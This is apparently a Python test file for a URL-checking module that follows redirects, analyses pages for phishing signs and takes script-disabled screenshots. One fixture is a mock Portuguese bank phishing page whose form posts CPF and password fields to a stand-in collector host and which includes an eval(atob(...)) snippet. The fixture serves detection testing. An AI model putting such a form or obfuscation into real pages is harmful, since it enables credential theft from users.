"""Live URL check: redirect chain, page reading, screenshot, storage."""

import hashlib
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from garbage_intel.db import initialize
from garbage_intel.errors import ConflictError, ValidationError
from garbage_intel.modules import live_check
from garbage_intel.net import FetchResult
from garbage_intel.workspace import update_settings

PHISH = b"""<html><head><title>Banco - Acesso</title></head><body>
<form action="https://collector.evil.example/p.php" method="post"><input name="cpf"><input type="password" name="senha"></form>
<script src="https://cdn.example.net/x.js"></script><iframe src="https://track.example.org/f"></iframe>
<script>eval(atob("YWxlcnQoMSk="))</script></body></html>"""


def answer(url, status=200, body=b"", headers=None):
    return FetchResult(url=url, final_url=url, status=status, headers=headers or {}, body=body,
                       sha256=hashlib.sha256(body).hexdigest(), address="203.0.113.9", elapsed_ms=3)


def web(url, **options):
    assert options["follow_redirects"] is False
    if url == "http://short.example/abc":
        return answer(url, 301, headers={"location": "https://login.bank-secure.example/entrar", "server": "nginx"})
    if url == "https://login.bank-secure.example/entrar":
        return answer(url, 200, PHISH, {"content-type": "text/html; charset=utf-8", "server": "Apache"})
    if url == "https://thin.example/":
        return answer(url, 200, b'<html><script>window.location.href = "https://next.example/x"</script></html>', {"content-type": "text/html"})
    if url == "https://file.example/get":
        return answer(url, 200, b"MZ...", {"content-type": "application/x-msdownload", "content-disposition": 'attachment; filename="nota.exe"'})
    raise AssertionError(url)


class LiveCheckTests(unittest.TestCase):
    def test_chain_page_and_flags(self):
        with patch.object(live_check, "FETCH", web):
            result, image = live_check.check("http://short.example/abc", take_screenshot=False)
        self.assertIsNone(image)
        self.assertEqual([(hop["status"], hop["url"]) for hop in result["hops"]], [(301, "http://short.example/abc"), (200, "https://login.bank-secure.example/entrar")])
        page = result["page"]
        self.assertEqual(page["title"], "Banco - Acesso")
        self.assertEqual((page["forms"][0]["password"], page["forms"][0]["other_site"], page["forms"][0]["field_names"]), (True, True, ["cpf", "senha"]))
        self.assertEqual({item["host"] for item in page["external_hosts"]}, {"cdn.example.net", "track.example.org"})
        self.assertIn("eval(atob(...))", page["obfuscation"])
        texts = " ".join(flag["text"] for flag in result["flags"])
        self.assertIn("Leva para outro site", texts)
        self.assertIn("pede senha e envia para outro site", texts)
        self.assertIn("ofuscado", texts)

    def test_thin_redirect_page_and_downloads(self):
        with patch.object(live_check, "FETCH", web):
            thin, _ = live_check.check("https://thin.example/", take_screenshot=False)
            download, _ = live_check.check("https://file.example/get", take_screenshot=False)
        self.assertEqual(thin["page"]["script_redirects"], ["https://next.example/x"])
        self.assertIn("redireciona sozinha", " ".join(flag["text"] for flag in thin["flags"]))
        self.assertEqual(download["page"]["download_name"], "nota.exe")
        self.assertIn("download (nota.exe)", " ".join(flag["text"] for flag in download["flags"]))

    def test_screenshot_command_without_javascript(self):
        calls = []

        def run(command, **options):
            calls.append(command)
            Path([part for part in command if part.startswith("--screenshot=")][0].split("=", 1)[1]).write_bytes(b"\x89PNG fake")

        with patch.object(live_check, "browser", lambda: ("chromium", "/usr/bin/chromium")), patch.object(live_check.subprocess, "run", run):
            image, note = live_check.screenshot("https://example.org/")
        self.assertEqual(image, b"\x89PNG fake")
        self.assertIn("--blink-settings=scriptEnabled=false", calls[0])
        self.assertTrue(any(part.startswith("--user-data-dir=") for part in calls[0]))
        self.assertIn("sem JavaScript", note)
        with patch.object(live_check, "browser", lambda: None):
            self.assertEqual(live_check.screenshot("https://example.org/")[0], None)

    def test_stored_with_screenshot_and_gated_by_network_setting(self):
        with tempfile.TemporaryDirectory() as folder:
            database = str(Path(folder) / "live.sqlite3")
            initialize(database)
            fake = {"url": "https://example.org", "final_url": "https://example.org", "hops": [{}], "flags": [], "page": None, "screenshot": {"taken": True}}
            with patch.object(live_check, "check", lambda url, **options: (fake, b"\x89PNG")):
                stored = live_check.run(database, url="example.org")
            self.assertEqual(live_check.get(database, stored["id"])["final_url"], "https://example.org")
            self.assertEqual(live_check.image(database, stored["id"]), b"\x89PNG")
            self.assertEqual(live_check.history(database, "https://example.org")["items"][0]["id"], stored["id"])
            with self.assertRaises(ValidationError):
                live_check.run(database, url="http://192.168.0.1/")
            update_settings(database, {"intel.allow_network": False})
            with self.assertRaises(ConflictError):
                live_check.run(database, url="example.org")


if __name__ == "__main__":
    unittest.main()
